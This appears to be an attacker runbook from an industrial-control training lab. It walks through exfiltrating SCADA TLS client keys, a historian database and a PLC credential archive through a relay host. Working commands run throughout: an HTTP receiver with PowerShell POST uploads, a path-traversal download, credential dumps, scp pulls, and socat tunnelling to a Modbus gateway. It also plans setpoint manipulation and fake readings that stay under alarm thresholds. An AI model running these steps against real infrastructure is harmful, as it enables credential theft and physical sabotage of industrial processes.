# Runbook: Operational zone exfiltration

Three hosts on `ics_operational` (10.10.2.0/24) carry material worth getting to unseen-gate.
None of them can reach the internet zone directly. wizzards-retreat bridges the gap.

## Common relay

wizzards-retreat is triple-homed. Its operational NIC (`eth3`, 10.10.2.3) sits on the
same /24 as all three targets, giving it direct ARP reach to each. Its internet NIC
(`eth1`, 10.10.0.10) reaches unseen-gate (10.10.0.5).

The pull leg at the end of each section is always:

```bash
mkdir -p ~/loot
scp 'rincewind@10.10.0.10:/tmp/loot/*' ~/loot/
```

Password: `wizzard`. wizzards-retreat allows password authentication; the credential is
known from the entry chain.

---

## 1. distribution-scada: TLS client certificate set

### Situation

The distribution-scada server (10.10.2.20) holds the stunnel client certificate set used
to authenticate to `uupl-modbus-gw` (10.10.2.50:8502). Three files in
`C:\SCADA\Config\certs\`:

- `client.key`: private key, world-readable (risk accepted 2020, ticket HEX-5103)
- `client.crt`: client certificate
- `ca.crt`: CA certificate that signed the gateway's server cert

With these, an attacker can open a raw TLS session to the Modbus gateway and send
unauthenticated Modbus commands directly to the PLC, bypassing the SCADA application
entirely. The gateway verifies the client cert; the PLC has no further authentication.

### Step 1: start receiver on wizzards-retreat

```bash
mkdir -p /tmp/loot
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class R(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        open('/tmp/loot/' + self.path.strip('/'), 'wb').write(self.rfile.read(n))
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('10.10.2.3', 9999), R).serve_forever()
" &
```

### Step 2: send certs from distribution-scada

From the distribution-scada facade shell:

```powershell
iwr -Method POST -Uri http://10.10.2.3:9999/client.key -InFile C:\SCADA\Config\certs\client.key
iwr -Method POST -Uri http://10.10.2.3:9999/client.crt -InFile C:\SCADA\Config\certs\client.crt
iwr -Method POST -Uri http://10.10.2.3:9999/ca.crt     -InFile C:\SCADA\Config\certs\ca.crt
```

### Step 3: confirm receipt on wizzards-retreat

```bash
kill %1
ls -lh /tmp/loot/
```

Expected: three non-empty files. A zero-byte file means the path in the `iwr` call was
wrong; re-send with the corrected path.

### Step 4: use the certs (optional, from wizzards-retreat)

wizzards-retreat's operational NIC (10.10.2.3) is on the same /24 as the Modbus gateway
(10.10.2.50). Run from wizzards-retreat:

```bash
openssl s_client -connect 10.10.2.50:8502 \
    -tls1_2 -cipher 'DEFAULT@SECLEVEL=0' \
    -cert /tmp/loot/client.crt \
    -key  /tmp/loot/client.key \
    -CAfile /tmp/loot/ca.crt
```

A successful handshake confirms the certs are valid and the gateway accepted them. For a
persistent local port:

```bash
socat TCP-LISTEN:5020,fork,reuseaddr \
    OPENSSL:10.10.2.50:8502,cert=/tmp/loot/client.crt,key=/tmp/loot/client.key,cafile=/tmp/loot/ca.crt,verify=1,cipher='DEFAULT@SECLEVEL=0'
```

Then tunnel through wizzards-retreat from unseen-gate to reach the socat listener and send
Modbus commands to the PLC without touching the SCADA application.

### Step 5: pull to unseen-gate

```bash
scp 'rincewind@10.10.0.10:/tmp/loot/client.key' ~/loot/
scp 'rincewind@10.10.0.10:/tmp/loot/client.crt' ~/loot/
scp 'rincewind@10.10.0.10:/tmp/loot/ca.crt'     ~/loot/
```

### Enabling

The stunnel gateway is dual-homed: 10.10.2.50 (operational) and 10.10.3.50 (control
zone). It is the only sanctioned path from the operational zone into the control zone for
Modbus traffic. Possessing the client cert set means the attacker can use that path
without the SCADA server being involved at all.

## 2. uupl-historian: SQLite database

### Situation

The historian web service at `10.10.2.10:8080` has an unpatched path traversal on the
`/export` endpoint. The `tag` parameter is passed unsanitised to a file read;
`tag=../historian.db` walks up from the export directory and serves the raw SQLite database.

The vulnerability is documented in `C:\Historian\Config\historian.ini` as
`HEX-2291, never filed`.

The database contains:

- `config` table: full credential set (`db_user`, `db_pass`, `ssh_user`, `ssh_pass`,
  `ingest_user`, `ingest_pass`)
- `alarm_config` table: trip thresholds for every monitored asset
- `readings` table: process history, one row per minute per asset

The alarm thresholds are the operationally significant item. Knowing at what RPM the
turbine overspeed alarm fires, and what the normal spread of readings looks like, is what
makes a manipulated historian reading stay below the detection horizon.

### Step 1: download the database from wizzards-retreat

The historian is reachable directly from wizzards-retreat's operational NIC. No receiver
needed here.

```bash
mkdir -p /tmp/loot
curl -s "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/loot/historian.db
ls -lh /tmp/loot/historian.db
```

A non-zero file size confirms the traversal worked. A zero-byte file means the service
was not running or the path changed.

### Step 2: query the database on wizzards-retreat

The database is usable immediately without moving it. wizzards-retreat has no sqlite3
CLI, but Python's built-in module covers the same ground:

```bash
python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM config;')]"
python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM alarm_config;')]"
python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute(\"SELECT * FROM readings WHERE asset='turbine_rpm' ORDER BY timestamp DESC LIMIT 20;\")]"
```

The `config` table returns the credential set. The `alarm_config` table returns the trip
thresholds. The `readings` query gives the most recent turbine RPM values and confirms the
normal operating range.

### Step 3: pull to unseen-gate

```bash
scp 'rincewind@10.10.0.10:/tmp/loot/historian.db' ~/loot/
```

### What this enables

The credential set from `config` is a secondary source for what is already available via
the SQL injection path (`/report?asset=x'+UNION+SELECT...`). Pulling the raw database adds
the `alarm_config` and `readings` tables, which the SQLi does not expose without a table
enumeration step.

The alarm thresholds from `alarm_config` are the key planning input for:

- Modbus setpoint manipulation that stays inside the alarm envelope
- False-reading injection timed to make the historian dashboard look normal while the PLC
  state diverges

The readings baseline also confirms that the historian is live and what assets are actively
being polled. A long gap in readings indicates either a poll failure or that the ingest cron
on the engineering workstation has stopped.

## 3. uupl-eng-ws: PLC backup archive

### Situation

The engineering workstation (10.10.2.30) holds a 2019 backup archive at
`backups\PLC_Backup_2019.tar.gz`. Contents:

- `plc-access-2019.conf`: the pre-audit credential set for every PLC, relay, and actuator
- `network_map_2019.txt`: the most complete device inventory in the lab; every operational
  and control-zone host with its IP, username, and password

The archive predates any credential rotation since 2019. Many of those credentials are
still valid. The map also documents hosts that may not appear in any other discovered
document.

SCP and SFTP from wizzards-retreat fail because sshd on the workstation runs subsystem and
exec requests through the Windows facade login shell, which rejects any command it does not
recognise. The working path is to SSH into the facade and push the file out using the
facade's `iwr -Method POST -InFile`.

wizzards-retreat holds an authorised SSH key for the `engineer` account at
`/home/rincewind/.ssh-keys/uupl_eng_key`, so logging in from there needs no password.

### Step 1: start a receiver on wizzards-retreat

```bash
mkdir -p /tmp/loot
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class R(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        open('/tmp/loot/' + self.path.strip('/'), 'wb').write(self.rfile.read(n))
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('10.10.2.3', 9999), R).serve_forever()
" &
```

### Step 2: SSH into the engineering workstation from wizzards-retreat

```bash
ssh -i /home/rincewind/.ssh-keys/uupl_eng_key engineer@10.10.2.30
```

No password. The workstation's `engineer` account was provisioned with wizzards-retreat's
public key.

### Step 3: push the archive from the facade

From the eng-ws facade shell:

```powershell
iwr -Method POST -Uri http://10.10.2.3:9999/PLC_Backup_2019.tar.gz -InFile backups\PLC_Backup_2019.tar.gz
```

### Step 4: confirm receipt and extract on wizzards-retreat

```bash
kill %1
ls -lh /tmp/loot/
tar xzf /tmp/loot/PLC_Backup_2019.tar.gz -C /tmp/loot/
cat /tmp/loot/PLC_Backup_2019/plc-access-2019.conf
cat /tmp/loot/PLC_Backup_2019/network_map_2019.txt
```

Expected: `PLC_Backup_2019.tar.gz` at roughly a kilobyte. Zero bytes means the path in the
`iwr` call was wrong or the receiver was not running when the POST went out.

### Step 5: pull to unseen-gate

```bash
scp 'rincewind@10.10.0.10:/tmp/loot/PLC_Backup_2019.tar.gz' ~/loot/
```

Or pull the extracted files directly if the archive has already been unpacked:

```bash
scp 'rincewind@10.10.0.10:/tmp/loot/PLC_Backup_2019/plc-access-2019.conf' ~/loot/
scp 'rincewind@10.10.0.10:/tmp/loot/PLC_Backup_2019/network_map_2019.txt' ~/loot/
```

### Enabling

`plc-access-2019.conf` carries the 2019 credential set. On a lab instance, these
credentials are still valid because no rotation has been simulated since that baseline.
This gives authenticated access to the PLC, relay, and actuator web interfaces without
needing to enumerate each one.

`network_map_2019.txt` names every device on the operational and control networks. For a
participant who reached the workstation without first mapping the network, this is the
complete target list: what exists, where it is, and what it accepts.

Combined with the credentials from `engineering_notes.txt` (already visible inside the
facade), the archive adds the 2019 device inventory and the pre-rotation credential
snapshot. The two together are the working credential set for the whole control network.
